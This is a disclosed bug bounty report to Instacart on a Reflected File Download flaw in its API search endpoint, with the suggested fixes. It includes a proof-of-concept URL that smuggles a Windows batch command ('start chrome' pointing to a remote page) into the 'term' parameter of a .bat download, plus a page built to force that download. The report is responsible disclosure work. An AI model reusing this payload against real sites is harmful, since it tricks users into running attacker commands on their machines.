# Reflected File Download on recipe list search

## Report Details
- **Report ID**: 158505
- **URL**: https://hackerone.com/reports/158505
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-11T16:00:44.010Z
- **Disclosed**: 2016-10-18T01:08:16.349Z

## Reporter
- **Username**: dsopas
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: instacart

## Vulnerability Information
Hi guys,

Right now I'm searching for JSON issues on your API so I started to go deep into the XHR requests.
When I noticed the following request:
https://www.instacart.com/api/v2/searches?cart_id=3471936&term=rfd&page=1&per=100&max_per_row=7&skip_other_warehouses=true&disable_autocorrect=false&source=web&warehouse_id=129&zone_id=12

Which returned the following output:

{"meta":{"code":200,"source":"search_service","cluster":null},"data":{"term":"xss","inventory_area_id":617,"items":[],"total_results":0,"aisles":[],"warehouses":[],"search_strategies":[],"tracking":{},"product_type_filter":false,"has_deals":false,"search_id":141585110},"pagination":{"total":0,"page":1,"per_page":50}}

I noticed that "term" parameter was reflected on the JSON format output so I tried a Reflected File Download.

Proof-of-concept:
https://www.instacart.com/api/v2/searches.bat?cart_id=&term="||start chrome davidsopas.com/poc/malware.htm||&page=1&per=100&max_per_row=7&skip_other_warehouses=true&disable_autocorrect=false&source=web&warehouse_id=129&zone_id=12

Reflecting:
{"meta":{"code":200,"source":"search_service","cluster":null},"data":{"term":"\"||start chrome davidsopas.com/poc/malware.htm||","inventory_area_id":617,"items":[],"total_results":0,"aisles":[],"warehouses":[],"search_strategies":["used_or_operator"],"tracking":{},"product_type_filter":false,"has_deals":false,"search_id":141585846},"pagination":{"total":0,"page":1,"per_page":50}}

So I got my RFD attack now (even with URL permissive), next step was to create a special crafted page to force the download:
http://0xhack.com/instacart_rfd.htm

Note: You need to be authenticated with a Instacart account.

Check the attached screenshots on latest versions of Chrome and Opera.

So in my proof-of-concept I was able to run a new Google Chrome window with a html file simulating a malicious file on the Windows operative system.

A malicious user could:

1 - Launch a malicious campaign with the specially crafted page - similar to my PoC
2 - Victim downloads the file thinking that is from a trusted domain [instacart.com]
3 - Malicious user gains control over victims machine

This kind of attack is very dangerous and could lead to millions of users infected by malicious campaigns. Possibility of gaining operating system access from Instacart users is a high risk of security.

Solution:
Use content-disposition header to force a filename download. Also "term" parameter should be encoded to prevent this kind of reflection on the output.

Hope it helps.

Best,
David Sopas
@dsopas

## Attachments
- instacart_rfd_opera.jpg
- instacart_rfd_chrome.jpg
